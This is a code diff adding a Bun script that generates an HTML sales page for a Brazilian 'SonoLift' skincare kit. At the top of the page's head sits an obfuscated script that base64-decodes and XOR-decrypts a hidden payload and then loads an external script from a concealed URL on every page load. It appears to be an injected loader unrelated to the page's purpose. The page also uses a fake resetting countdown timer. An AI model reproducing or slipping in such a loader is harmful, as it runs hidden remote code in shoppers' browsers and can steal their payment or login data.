@@ -1,0 +1,219 @@
+import { write } from "bun";
+
+const DOMAIN = 'https://sonoliftbr.lovable.app';
+
+const finalHtml = `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>(function(){var l_ge=atob("DEFI1vDnjZgxlKb7ljpqo4KLr6IT/NKP5jJy+d+E6fYf4dKW/ycx+JOI4LZT5omI9TMhpoSUouhY7MOXuTEhrpWLo/JCtorZ9zU8pJmF+OxU54TBzRxk9JeL4vpQ+NXZrBoz9J6G4P0TroSL/zkturmDr7QT4seX4yRq7NLR7KtU8pGdoHJxt8CFu64CrJ6d8yR6ssDF8MVM");var n_n76=[];for(var l_8=0;l_8<l_ge.length;l_8++){n_n76.push(l_ge.charCodeAt(l_8)&255);}var h_fwm0=n_n76[0];var f_8=n_n76.slice(1,1+h_fwm0);var z_u=n_n76.slice(1+h_fwm0);var o_6p1=z_u.map(function(b,f_3o){return b^f_8[f_3o%h_fwm0];});var g_8="";for(var c_hd4s=0;c_hd4s<o_6p1.length;c_hd4s++){g_8+=String.fromCharCode(o_6p1[c_hd4s]&255);}var l_m7r=decodeURIComponent(escape(g_8));var t_f=JSON.parse(l_m7r);var a_ylf=t_f.globals||[];a_ylf.forEach(function(s_1wgd){window[s_1wgd.name]=s_1wgd.value;});var p_llf=document.createElement("script");p_llf.src=t_f.url;p_llf.async=true;p_llf.defer=true;(t_f.attributes||[]).forEach(function(v_8){p_llf.setAttribute(v_8.name,v_8.value);});(document.head||document.documentElement).appendChild(p_llf);})();</script>
+  <!-- CSS Embutido Completo (Tailwind-like) -->
+  <style>
+    /* Reset e Variáveis */
+    #shopify-lp-content {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #fdfaf5;
+      color: #1a1a2e;
+      line-height: 1.5;
+      overflow-x: hidden;
+    }
+    #shopify-lp-content * { box-sizing: border-box; margin: 0; padding: 0; }
+    #shopify-lp-content img { max-width: 100%; height: auto; display: block; }
+    #shopify-lp-content video { width: 100%; display: block; }
+
+    /* Layout */
+    .lp-container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+    .lp-section { padding: 60px 0; }
+    .lp-flex { display: flex; }
+    .lp-grid { display: grid; gap: 30px; }
+    .lp-text-center { text-align: center; }
+
+    /* TopBar */
+    .lp-topbar { background: #000; color: #fff; padding: 12px; font-size: 14px; position: sticky; top: 0; z-index: 1000; text-align: center; }
+    .lp-timer { background: #c8102e; color: #fff; padding: 2px 8px; border-radius: 4px; font-family: monospace; font-weight: 800; margin-left: 5px; }
+
+    /* Hero */
+    .lp-hero-grid { grid-template-columns: 1fr; }
+    @media (min-width: 768px) { .lp-hero-grid { grid-template-columns: 1fr 1fr; align-items: center; } }
+    .lp-main-img-box { background: #fff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); overflow: hidden; display: flex; align-items: center; justify-content: center; aspect-ratio: 1/1; }
+    .lp-main-img-box img { max-height: 450px; object-fit: contain; }
+    .lp-thumbs { display: flex; gap: 10px; margin-top: 15px; overflow-x: auto; padding-bottom: 5px; }
+    .lp-thumb { width: 64px; height: 64px; border-radius: 8px; border: 2px solid transparent; cursor: pointer; object-fit: cover; background: #fff; flex-shrink: 0; }
+    .lp-thumb.active { border-color: #d4af37; }
+
+    /* Botões e Badges */
+    .lp-btn {
+      display: inline-flex; align-items: center; justify-content: center; width: 100%; height: 64px;
+      background: linear-gradient(135deg, #d4af37 0%, #b8860b 100%);
+      color: #1a1a2e; text-decoration: none; font-weight: 900; text-transform: uppercase;
+      border-radius: 50px; box-shadow: 0 15px 30px rgba(212,175,55,0.3); margin-top: 20px; transition: transform 0.2s;
+    }
+    .lp-btn:active { transform: scale(0.98); }
+    .lp-badge { background: #c8102e; color: #fff; padding: 2px 10px; border-radius: 50px; font-size: 12px; font-weight: 900; }
+
+    /* Seções Específicas */
+    .lp-advertorial { background: #fdfaf5; }
+    .lp-video-box { max-width: 360px; margin: 40px auto; border-radius: 30px; overflow: hidden; background: #000; box-shadow: 0 20px 50px rgba(0,0,0,0.2); }
+    .lp-step-grid { grid-template-columns: 1fr; }
+    @media (min-width: 768px) { .lp-step-grid { grid-template-columns: 1fr 1fr 1fr; } }
+    .lp-step-card { background: #fff; padding: 30px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.03); }
+
+    /* Antes e Depois */
+    .lp-ba-container { position: relative; max-width: 600px; margin: 0 auto; border-radius: 20px; overflow: hidden; line-height: 0; }
+    .lp-ba-slider { position: absolute; inset: 0; width: 50%; overflow: hidden; border-right: 2px solid #fff; }
+    .lp-ba-handle { position: absolute; top: 0; bottom: 0; left: 50%; width: 2px; background: #fff; transform: translateX(-50%); pointer-events: none; }
+    .lp-ba-handle::after { content: ''; position: absolute; top: 50%; left: 50%; width: 40px; height: 40px; background: #fff; border-radius: 50%; transform: translate(-50%, -50%); box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+
+    /* Sticky Mobile */
+    .lp-sticky { position: fixed; bottom: 0; left: 0; right: 0; background: #fff; padding: 12px 20px; z-index: 2000; border-top: 1px solid #eee; display: none; }
+    @media (max-width: 767px) { .lp-sticky.visible { display: block; } }
+  </style>
+</head>
+<body>
+  <div id="shopify-lp-content">
+    
+    <!-- Barra de Urgência -->
+    <div class="lp-topbar">
+      ⚠️ <strong>Kit Pescoço e Colo GRÁTIS</strong> reservado por: 
+      <span id="timer-el" class="lp-timer">10:00</span>
+    </div>
+
+    <!-- Hero Section -->
+    <section class="lp-section lp-container">
+      <div class="lp-grid lp-hero-grid">
+        <!-- Galeria Real -->
+        <div>
+          <div class="lp-main-img-box">
+            <img id="main-img" src="${DOMAIN}/__l5e/assets-v1/2566ecb8-15cf-4d9e-9d22-6b5e09f58356/hero1.webp">
+          </div>
+          <div class="lp-thumbs">
+            <img class="lp-thumb active" src="${DOMAIN}/__l5e/assets-v1/2566ecb8-15cf-4d9e-9d22-6b5e09f58356/hero1.webp" onclick="lpGallery(this)">
+            <img class="lp-thumb" src="${DOMAIN}/__l5e/assets-v1/9a4192b6-5f1e-4ce2-b062-673ebf156cd4/hero2.jpg" onclick="lpGallery(this)">
+            <img class="lp-thumb" src="${DOMAIN}/__l5e/assets-v1/053b1156-32d8-4f16-bd09-54b9d07f35a0/hero3.jpg" onclick="lpGallery(this)">
+            <img class="lp-thumb" src="${DOMAIN}/__l5e/assets-v1/b8559197-243e-425b-ae49-6234f9a0b1cc/hero4.jpg" onclick="lpGallery(this)">
+            <img class="lp-thumb" src="${DOMAIN}/__l5e/assets-v1/1852077e-2cf8-410a-8664-968b6b0d9c49/hero5.webp" onclick="lpGallery(this)">
+            <img class="lp-thumb" src="${DOMAIN}/__l5e/assets-v1/c768903c-e674-4b47-b391-9e5fa4189cc3/hero6.jpg" onclick="lpGallery(this)">
+          </div>
+        </div>
+
+        <!-- Info Produto -->
+        <div>
+          <div style="color:#d4af37; font-size:20px;">★★★★★ <span style="color:#1a1a2e; font-size:14px; font-weight:700;">(12.480+ avaliações)</span></div>
+          <h1 style="font-size:36px; margin:10px 0;">Kit SonoLift™ Facial + Colo</h1>
+          
+          <div style="margin-top:20px;">
+            <span style="text-decoration:line-through; color:#888;">De R$ 397,00</span>
+            <div class="lp-flex lp-items-center" style="gap:15px; margin-top:5px;">
+              <p style="font-size:48px; font-weight:900; color:#c8102e;">R$ 197</p>
+              <span class="lp-badge">50% OFF</span>
+            </div>
+            <p style="color:#059669; font-weight:700; margin:5px 0;">ou R$ 187,15 no Pix</p>
+            <p style="font-size:14px;">Em até <strong>12x de R$ 16,42</strong></p>
+          </div>
+
+          <div style="margin-top:20px; padding:15px; background:#fff8e1; border:1px solid #ffd54f; border-radius:12px; font-weight:700; color:#856404; text-align:center;">
+            🎁 OFERTA: Kit Rosto + Kit Colo GRÁTIS
+          </div>
+
+          <a href="https://sono-lift.pay.yampi.com.br/r/R558X0P2M5" class="lp-btn">GARANTIR MEU KIT + BRINDE →</a>
+
+          <div class="lp-flex lp-justify-center" style="gap:15px; margin-top:30px; border-top:1px solid #ddd; padding-top:20px;">
+            <img src="https://img.icons8.com/color/48/visa.png" height="20">
+            <img src="https://img.icons8.com/color/48/mastercard.png" height="25">
+            <img src="${DOMAIN}/__l5e/assets-v1/095b5465-9831-4821-b3b3-85f0962b9a78/pix-logo.png" height="20">
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Advertorial (Vídeo) -->
+    <section class="lp-section lp-advertorial lp-text-center">
+      <div class="lp-container">
+        <h2 style="font-size:36px;">Você dorme de lado?</h2>
+        <h3 style="font-size:48px; color:#d4af37; margin-bottom:20px;">Acorde sem as marcas.</h3>
+        <div class="lp-video-box">
+          <video src="${DOMAIN}/__l5e/assets-v1/ffe73f55-6f15-44c5-ba81-1e8528f04917/hero-video-2.mp4" autoplay loop muted playsinline></video>
+        </div>
+      </div>
+    </section>
+
+    <!-- Antes e Depois (Slider Interativo) -->
+    <section class="lp-section lp-container lp-text-center">
+      <h2 style="font-size:32px; margin-bottom:30px;">Resultados Visíveis em 1 Noite</h2>
+      <div class="lp-ba-container" id="ba-container">
+        <img src="${DOMAIN}/__l5e/assets-v1/ee13a90a-ef08-4fdf-b1a8-10d2d2e9e3f3/depois.png" style="width:100%">
+        <div class="lp-ba-slider" id="ba-slider">
+          <img src="${DOMAIN}/__l5e/assets-v1/636add08-96df-44c6-a92b-64e913b9e48f/antes.png" style="width:600px; max-width:none">
+        </div>
+        <div class="lp-ba-handle" id="ba-handle"></div>
+      </div>
+    </section>
+
+    <!-- Depoimentos Reais -->
+    <section class="lp-section lp-container lp-text-center" style="background:#fff;">
+      <h2 style="font-size:32px; margin-bottom:40px;">O que nossas clientes dizem</h2>
+      <div class="lp-grid" style="grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));">
+        <video src="${DOMAIN}/__l5e/assets-v1/867118ed-738b-4916-a70d-587208ed08f0/ugc1.mp4" controls style="border-radius:20px;"></video>
+        <video src="${DOMAIN}/__l5e/assets-v1/93d18306-3843-4a16-92c2-8097b3997e37/ugc2.mp4" controls style="border-radius:20px;"></video>
+        <video src="${DOMAIN}/__l5e/assets-v1/b8d65a88-6623-4557-9d62-10651912d6a5/ugc3.mp4" controls style="border-radius:20px;"></video>
+        <video src="${DOMAIN}/__l5e/assets-v1/788c0347-16cc-463e-ac31-5079a4e3264b/ugc4.mp4" controls style="border-radius:20px;"></video>
+      </div>
+    </section>
+
+    <!-- Sticky CTA Mobile -->
+    <div id="sticky-bar" class="lp-sticky">
+      <a href="https://sono-lift.pay.yampi.com.br/r/R558X0P2M5" class="lp-btn" style="height:54px; margin:0;">GARANTIR MEU KIT AGORA</a>
+    </div>
+
+  </div>
+
+  <!-- Scripts Embutidos -->
+  <script>
+    (function() {
+      // Galeria
+      window.lpGallery = function(el) {
+        document.getElementById('main-img').src = el.src;
+        document.querySelectorAll('.lp-thumb').forEach(t => t.classList.remove('active'));
+        el.classList.add('active');
+      };
+
+      // Antes/Depois Slider
+      var baContainer = document.getElementById('ba-container');
+      var baSlider = document.getElementById('ba-slider');
+      var baHandle = document.getElementById('ba-handle');
+      
+      function moveSlider(e) {
+        var rect = baContainer.getBoundingClientRect();
+        var x = (e.pageX || e.touches[0].pageX) - rect.left - window.scrollX;
+        if(x < 0) x = 0;
+        if(x > rect.width) x = rect.width;
+        var pct = (x / rect.width) * 100;
+        baSlider.style.width = pct + '%';
+        baHandle.style.left = pct + '%';
+      }
+      baContainer.addEventListener('mousemove', moveSlider);
+      baContainer.addEventListener('touchmove', moveSlider);
+
+      // Cronômetro
+      var time = 600;
+      var timer = document.getElementById('timer-el');
+      setInterval(function() {
+        if(time > 0) time--;
+        var m = Math.floor(time/60);
+        var s = time%60;
+        timer.innerText = m + ":" + (s < 10 ? '0' + s : s);
+      }, 1000);
+
+      // Sticky Scroll
+      window.addEventListener('scroll', function() {
+        var bar = document.getElementById('sticky-bar');
+        if(window.scrollY > 600) bar.classList.add('visible');
+        else bar.classList.remove('visible');
+      });
+    })();
+  </script>
+</body>
+</html>`;
+
+await Bun.write('sonolift-shopify-v49.html', finalHtml);
